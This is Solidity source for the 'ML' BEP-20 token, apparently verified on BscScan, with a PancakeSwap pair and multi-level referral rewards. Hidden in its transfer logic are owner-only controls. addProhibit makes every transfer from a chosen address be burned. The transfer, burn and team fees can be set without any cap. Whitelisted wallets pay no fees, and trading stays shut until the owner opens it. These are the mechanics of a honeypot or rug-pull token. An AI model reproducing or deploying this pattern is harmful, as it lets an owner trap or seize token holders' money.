/**
 *Submitted for verification at BscScan.com on 2023-03-13
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.6;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Ownable {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor ()  {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
    external
    view
    returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
    external
    view
    returns (
        uint112 reserve0,
        uint112 reserve1,
        uint32 blockTimestampLast
    );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function mint(address to) external returns (uint256 liquidity);

    function burn(address to)
    external
    returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external
    payable
    returns (
        uint256 amountToken,
        uint256 amountETH,
        uint256 liquidity
    );

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
    external
    view
    returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
    external
    view
    returns (uint256[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

abstract contract Operate is Ownable{
    using SafeMath for uint256;

    uint256 private parameterBase = 100000;

    mapping(address=>bool) private _prohibit;

    function getProhibit(address addr) public view returns (bool) {
        return _prohibit[addr];
    }

    function addProhibit(address addr) public onlyOwner {
        _prohibit[addr]=true;
    }

    function subProhibit(address addr) public onlyOwner {
        _prohibit[addr]=false;
    }

    //----------------------------------------------------------------

    uint256 private transferFee = 6000;

    function setTransferFee(uint256 _fees) public onlyOwner {
        transferFee=_fees;
    }

    function getTransferFee(uint256 amount) public view returns (uint256) {
        return amount.mul(transferFee).div(parameterBase);
    }

    //----------------------------------------------------------------

    mapping(address=>bool) private _open;

    function getOpen(address addr) public view returns (bool) {
        return _open[addr];
    }
    function addOpen(address addr) public onlyOwner {
        _open[addr]=true;
    }
    function subOpen(address addr) public onlyOwner {
        _open[addr]=false;
    }

    //----------------------------------------------------------------

    uint256 private swapBurn =2000;

    function setSwapBurn(uint256 _fees) public onlyOwner {
        swapBurn=_fees;
    }

    function getSwapBurn(uint256 amount) public view returns (uint256) {
        return amount.mul(swapBurn).div(parameterBase);
    }

    uint256 private swapBackflow=1000;

    function setSwapBackflow(uint256 _fees) public onlyOwner {
        swapBackflow=_fees;
    }

    function getSwapBackflow(uint256 amount) public view returns (uint256) {
        return amount.mul(swapBackflow).div(parameterBase);
    }
    uint256[] private swapTeam =[1000,500,500];

    function setSwapTeam(uint256[] memory _fees) public onlyOwner {
        swapTeam=_fees;
    }

    function getSwapTeam(uint256 amount) public view returns (uint256[] memory) {
        uint256[] memory fee;
        fee = new uint256[](swapTeam.length);
        for(uint256 i=0;i<swapTeam.length;i++){
            fee[i]=amount.mul(swapTeam[i]).div(parameterBase);
        }
        return fee;
    }
    
}

contract ML is IERC20,Operate {
    using SafeMath for uint256;

    mapping(address => uint256) private _tOwned;

    mapping(address => mapping(address => uint256)) private _allowances;

    address private operateAddress = 0xE04305e3DaDc39F5efccd44115D0F5703CAC8E6F;

    string private _name = "ML";
    string private _symbol = "ml";
    uint8 private _decimals = 18;
    uint256 private _tTotal = 3000000 * 10 ** 18;
    uint256 private _destroy=0;
    uint256 private openingTime = 0 ;

    IUniswapV2Pair private _uniswapV2Pair;
    address private token0;

    mapping(address => address) public inviter;

    IUniswapV2Router02 public immutable uniswapV2Router;
    address public immutable uniswapV2Pair;

    event BindInviter(address indexed addr, address indexed upAddr);

    constructor() {
        _tOwned[msg.sender] = _tTotal;
        addOpen(msg.sender);

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            0x10ED43C718714eb63d5aA57B78B54704E256024E
        );

        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
        .createPair(address(this), 0x55d398326f99059fF775485246999027B3197955);

        _uniswapV2Pair=IUniswapV2Pair(uniswapV2Pair);
        token0=_uniswapV2Pair.token0();

        // set the rest of the contract variables
        uniswapV2Router = _uniswapV2Router;

        emit Transfer(address(0), msg.sender, _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    function destroy() public view returns (uint256) {
        return _destroy;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function surplusBurn() public view  returns (uint256) {
        return 2979000*10**18-_destroy;
    }

    function openingSwap() public onlyOwner{
        openingTime=block.timestamp;
    }

    function setOperateAddress(address _operate) public onlyOwner{
        operateAddress=_operate;
    }

    function getSwapNum() public view returns (uint256){
        (uint256 reserve0,uint256 reserve1,)=_uniswapV2Pair.getReserves();
        uint256 amount;
        if (token0==address(this)){
            amount=uniswapV2Router.getAmountOut(50*10**18,reserve0,reserve1);
        }else{
            amount=uniswapV2Router.getAmountOut(50*10**18,reserve0,reserve1);
        }
        return amount;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    
    function _burnLimit(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        _tOwned[account] = _tOwned[account].sub(amount);
        _burn(account,amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(_destroy.add(amount)<=2979000*10**18, "ERC20: Shielding reaches the highest");
        _destroy=_destroy.add(amount);
        _tOwned[address(0)] = _tOwned[address(0)].add(amount);
        emit Transfer(account, address(0), amount);
    }

    function burn(uint256 amount) public virtual {
        _burnLimit(msg.sender, amount);
    }

    function burnFrom(address account, uint256 amount) public virtual {
        uint256 currentAllowance = allowance(account, msg.sender);
        require(currentAllowance >= amount, "ERC20: burn amount exceeds allowance");
    unchecked {
        _approve(account, msg.sender, currentAllowance.sub(amount));
    }
        _burnLimit(account, amount);
    }

    function transfer(address recipient, uint256 amount)
    public
    override
    returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
    public
    view
    override
    returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
    public
    override
    returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
    public
    virtual
    returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
    public
    virtual
    returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (getOpen(from)==true || getOpen(to)==true){
            _tOwned[from] = _tOwned[from].sub(amount);
            _tOwned[to] = _tOwned[to].add(amount);
            emit Transfer(from, to, amount);
            return;
        }
        require(balanceOf(from).sub(amount) >= 1000000000000, "Keep some funds");
        _tOwned[from] = _tOwned[from].sub(amount);
        if (getProhibit(from)==true){
            _burn(from,amount);
            return;
        }
        if (to == uniswapV2Pair || from == uniswapV2Pair) {
            require(openingTime > 0, "Transaction not opened");
            if (openingTime+(60*60)>block.timestamp && from==uniswapV2Pair){
                require(amount.add(balanceOf(to)) <= getSwapNum(), "Purchase restriction");
            }
            
            uint256 swapBackflow=getSwapBackflow(amount);
            uint256[] memory swapTeam=getSwapTeam(amount);
            address execute = from;
            if (from==uniswapV2Pair){
                execute=to;
            }
            for(uint256 i=0;i<swapTeam.length;i++){
                execute=inviter[execute];
                if (execute==address(0)){
                    swapBackflow=swapBackflow.add(swapTeam[i]);
                }else{
                    _tOwned[execute] = _tOwned[execute].add(swapTeam[i]);
                    amount=amount.sub(swapTeam[i]);
                    emit Transfer(from, execute, swapTeam[i]);
                }
            }
            _tOwned[operateAddress] = _tOwned[operateAddress].add(swapBackflow);
            amount=amount.sub(swapBackflow);
            emit Transfer(from, operateAddress, swapBackflow);
            
            uint256 swapBurnAmount=getSwapBurn(amount);
            if (_destroy.add(swapBurnAmount)<=2979000*10**18){
                _burn(from,swapBurnAmount);
                amount=amount.sub(swapBurnAmount);
            }
            
            _tOwned[to] = _tOwned[to].add(amount);
            emit Transfer(from, to, amount);
        }else {
            uint256 transferFeeNum=getTransferFee(amount);
            if (transferFeeNum>0){
                _tOwned[operateAddress] = _tOwned[operateAddress].add(transferFeeNum);
                emit Transfer(from, operateAddress, transferFeeNum);
            
                amount=amount.sub(transferFeeNum);
            }
            _tOwned[to] = _tOwned[to].add(amount);
            emit Transfer(from, to, amount);
        }
    }

    function bindInviter(address addr)
    public
    returns (bool){
        require(inviter[msg.sender]==address(0),"Bound to superior");
        require(msg.sender!=addr,"Unable to bind the address");
        address upAddr =addr;
        for (uint i = 0; i < 5; i++){
            upAddr=inviter[upAddr];
            require(msg.sender!=upAddr,"Unable to bind the address");
        }
        inviter[msg.sender]=addr;
        emit BindInviter(msg.sender,addr);
        return true;
    }
}